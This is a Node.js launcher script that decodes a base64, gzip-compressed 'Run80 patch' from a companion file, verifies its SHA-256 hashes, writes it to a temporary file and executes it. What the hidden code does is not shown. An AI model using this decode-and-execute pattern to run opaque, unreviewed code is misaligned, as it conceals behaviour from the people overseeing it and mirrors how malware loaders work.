"use strict";
const fs = require("node:fs");
const path = require("node:path");
const os = require("node:os");
const zlib = require("node:zlib");
const crypto = require("node:crypto");
const { spawnSync } = require("node:child_process");
const encoded = require("./apply-technical-payload-validation-run80.payload.cjs");
const compressed = Buffer.from(encoded, "base64");
const compressedSha = crypto.createHash("sha256").update(compressed).digest("hex");
if (compressedSha !== "68995287fd4b8b583ba339ffdf6412fcb07c30c3e11d922d402c12edc959a5c7") throw new Error("Run80 compressed patch SHA-256 mismatch");
const inner = zlib.gunzipSync(compressed);
const innerSha = crypto.createHash("sha256").update(inner).digest("hex");
if (innerSha !== "39d668b4be0e23752a7f7d0db5d4d1a7a59006ceb6e6d4b3fbd33780b7f4b387") throw new Error("Run80 patch SHA-256 mismatch");
const temp = path.join(os.tmpdir(), "vag-tech-pro-run80-" + process.pid + ".cjs");
fs.writeFileSync(temp, inner, { flag: "wx" });
try {
  const result = spawnSync(process.execPath, [temp, ...process.argv.slice(2)], { stdio: "inherit" });
  if (result.error) throw result.error;
  process.exitCode = result.status == null ? 1 : result.status;
} finally {
  fs.rmSync(temp, { force: true });
}
